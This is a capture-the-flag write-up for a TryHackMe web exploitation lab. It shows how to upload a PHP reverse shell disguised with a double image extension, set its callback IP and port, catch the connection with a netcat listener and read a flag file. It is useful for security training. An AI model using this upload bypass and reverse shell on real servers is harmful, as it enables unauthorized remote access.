# [Day 2] Web Exploitation - The Elf strikes back

> César Martínez | 19 December 2020

## Topics

- GET Parameters and URLs
- File Uploads
- Reverse Shells
- Reverse Shell Listeners

### 1. What string of text needs adding to the URL to get access to the uplooad page?
```
?id=ODIzODI5MTNiYmYw
```

### 2. What type of file is accepted by the site?
```
image
```
The image types that are accepted can be found in the source code of the page. They all have one thing in common; they are images.

### 3. In which directory are the uploaded files stored?
```
/uploads/
```
You can run a tool like gobuster to find this directory, but earlier on the dossier they mentioned this example directory.

### 4. What is the flag in `/var/www/flag.txt`?

In the upload page, we'll have to upload a php reverse shell script disguised as an image, and then listen to the conection with Netcat to gain access to the machine.\
The AttackBox that THM provides and Kali Linux provide a php reverse shell script in `/usr/share/webshells/php/` called `php-reverse-shell.php`. First we are going to copy the script into our directory:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.jpeg.php
```
We then need to edit the script. Below the starting comments we should se some variables being declared, we need to change the ones that are marked. The ip should be the one of the AttackBox and the port could be left as is but as stated in the dossier, we are going to use 443.

It should look something like this:
```php
$ip = '10.10.188.80';   //CHANGE THIS
$port = 443;    //CHANGE THIS
```
Once we have the script ready, we have to start our listener for port 443. For that we use the command given to us in the dossier:
```bash
sudo nc -lvnp 443
```
That is going to start the listener. Now we have to upload the script in the website. Make sure to show __All Files__ in case it doesn't appear in the file browser.\
Once uploaded, head to the uploads directory and click on the file we just uploaded. The moment we click our script we are going to get a reverse shell in the terminal where we were listening.\
With our new shell we just need to cat the flag in `/var/www/flag.txt` to finish the challenge.
